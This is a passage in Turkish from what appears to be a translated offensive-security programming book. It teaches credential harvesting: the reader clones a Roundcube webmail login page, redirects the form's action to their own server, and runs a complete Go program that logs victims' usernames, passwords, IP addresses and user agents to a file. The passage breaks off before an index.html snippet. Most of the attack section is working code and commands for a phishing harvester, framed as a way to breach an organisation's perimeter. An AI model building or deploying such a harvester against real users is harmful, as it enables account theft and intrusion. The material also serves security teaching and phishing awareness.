## Kimlik Bilgisi Toplama (Credential Harvesting)

Sosyal mühendisliğin temel saldırı türlerinden biri, kimlik bilgisi toplama (credential-harvesting) saldırısıdır. Bu tür bir saldırı, kullanıcıları, orijinal sitenin klonlanmış bir sürümüne kimlik bilgilerini girmeye ikna ederek belirli web siteleri için kullanılan oturum açma bilgilerini ele geçirir. Bu saldırı, internete tek faktörlü kimlik doğrulama arayüzü açan kuruluşlara karşı kullanışlıdır. Bir kullanıcının kimlik bilgilerini elde ettiğinizde, bunları gerçek sitedeki hesabına erişmek için kullanabilirsiniz. Bu da çoğu zaman kuruluşun çevre (perimeter) ağında ilk ihlalin gerçekleşmesine yol açar.

Go, bu tür bir saldırı için harika bir platform sunar; çünkü yeni sunucuları hızlıca ayağa kaldırmayı sağlar ve yönlendirme (routing) yapılandırmayı ve kullanıcıdan gelen girdiyi ayrıştırmayı (parse) kolaylaştırır. Bir kimlik bilgisi toplama sunucusuna pek çok özelleştirme ve özellik ekleyebilirsiniz, ancak bu örnek için temel konularla yetinelim.

Başlangıç olarak, oturum açma formu olan bir siteyi klonlamanız gerekir. Bu konuda çok sayıda olasılık bulunur. Pratikte, hedefin kullandığı bir siteyi klonlamak isteyeceksiniz. Ancak bu örnekte bir Roundcube sitesini klonlayacaksınız. Roundcube, Microsoft Exchange gibi ticari yazılımlar kadar sık kullanılmayan, açık kaynaklı bir web posta istemcisidir; ancak kavramları açıklamak için fazlasıyla yeterli olacaktır. Süreci kolaylaştırmak için Roundcube’u Docker ile çalıştıracaksınız.

Kendi Roundcube sunucunuzu şu komutu çalıştırarak başlatabilirsiniz. Eğer Roundcube sunucusu çalıştırmak istemiyorsanız sorun değil; egzersiz kaynak kodunda sitenin bir klonu bulunuyor. Yine de, tamlık açısından bunu da ekliyoruz:

```bash
$ docker run --rm -it -p 127.0.0.1:80:80 robbertkl/roundcube
```

Bu komut, bir Roundcube Docker örneği başlatır. `http://127.0.0.1:80` adresine giderseniz, karşınıza bir oturum açma formu çıkacaktır. Normalde, bir siteyi ve gerekli tüm dosyalarını klonlamak için `wget` kullanırdınız; ancak Roundcube, bunun çalışmasını engelleyen JavaScript “harikaları”na sahiptir. Bunun yerine, sayfayı kaydetmek için Google Chrome kullanacaksınız. Egzersiz klasörü içinde, Liste 4-7’de gösterilene benzer bir dizin yapısı görmelisiniz.

```bash
$ tree

+-- main.go
+-- public
   +-- index.html
   +-- index files
       +-- app.js
       +-- common.js
       +-- jquery-ui-1.10.4.custom.css
       +-- jquery-ui-1.10.4.custom.min.js
       +-- jquery.min.js
       +-- jstz.min.js
       +-- roundcube_logo.png
       +-- styles.css
       +-- ui.js
    index.html
```

**Liste 4-7** `/ch-4/credential_harvester/` için dizin listesi

`public` dizinindeki dosyalar, değiştirilmemiş, klonlanmış oturum açma sitesini temsil eder. Kullanıcı tarafından girilen kimlik bilgilerini, gerçek sunucu yerine size gönderecek şekilde orijinal oturum açma formunu değiştirmeniz gerekir. Başlangıç olarak, `public/index.html` dosyasını açın ve oturum açma isteğini `POST` eden form elemanını bulun. Şuna benzer görünmelidir:

```html
<form name="form" method="post" action="http://127.0.0.1/?_task=login">
```

Bu etiketin `action` niteliğini değiştirip kendi sunucunuzu işaret edecek şekilde ayarlamanız gerekir. `action` değerini `/login` olarak değiştirin. Kaydetmeyi unutmayın. Satır artık şöyle görünmelidir:

```html
<form name="form" method="post" action="/login">
```

Oturum açma formunu doğru şekilde göstermek ve bir kullanıcı adı ile parolayı yakalamak için önce `public` dizinindeki dosyaları servis etmeniz gerekir. Ardından, kullanıcı adı ve parolayı yakalamak için `/login` için bir `HandleFunc` yazmanız gerekir. Ayrıca, yakalanan kimlik bilgilerini ayrıntılı günlük (verbose logging) ile bir dosyaya kaydetmek isteyeceksiniz.

Tüm bunları yalnızca birkaç düzine satır kodla halledebilirsiniz. Programın tamamı Liste 4-8’de gösterilmiştir.

```go
package main

import (
   "net/http"

    "time"

   log "github.com/Sirupsen/logrus" // yapılandırılmış loglama için logrus
   "github.com/gorilla/mux"
)

func login(w http.ResponseWriter, r *http.Request) {
    log.WithFields(log.Fields{
         "time":        time.Now().String(),
         "username":    r.FormValue("_user"),
         "password":    r.FormValue("_pass"),
         "user-agent":  r.UserAgent(),
         "ip_address":  r.RemoteAddr,
    }).Info("login attempt")
    http.Redirect(w, r, "/", 302)
}

func main() {
    fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
    if err != nil {
         panic(err)
     }
     defer fh.Close()
     log.SetOutput(fh)
     r := mux.NewRouter()
     r.HandleFunc("/login", login).Methods("POST")
     r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
     log.Fatal(http.ListenAndServe(":8080", r))
}
```

**Liste 4-8:** Kimlik bilgisi toplama sunucusu (`/ch-4/credential_harvester/main.go`)

Dikkat edilmesi gereken ilk şey, `github.com/Sirupsen/logrus` paketini içe aktarmanızdır. Bu, standart Go `log` paketi yerine kullanmayı tercih ettiğimiz, yapılandırılmış (structured) bir loglama paketidir. Daha iyi hata işleme için daha fazla yapılandırılabilir loglama seçeneği sunar. Bu paketi kullanmak için, önceden `go get` çalıştırdığınızdan emin olmalısınız.

Sonraki adımda `login()` handler fonksiyonunu tanımlarsınız. Umarız bu kalıp size tanıdık geliyordur. Bu fonksiyon içinde, yakaladığınız veriyi yazdırmak için `log.WithFields()` kullanırsınız. İstemcinin talebine ait mevcut zamanı, `user-agent` bilgisini ve IP adresini gösterirsiniz. Ayrıca, gönderilen kullanıcı adı (`_user`) ve parola (`_pass`) değerlerini yakalamak için `FormValue(string)` fonksiyonunu çağırırsınız. Bu değerleri `index.html` dosyasından, her bir kullanıcı adı ve parola için form input elemanlarını bularak alırsınız. Sunucunuzun, oturum açma formunda var oldukları şekliyle alan adlarıyla açıkça hizalanması gerekir.

Aşağıdaki, `index.html` dosyasından alınmış kod parçası, ilgili input öğelerini gösterir; netlik için eleman adları kalın yazılmıştır:
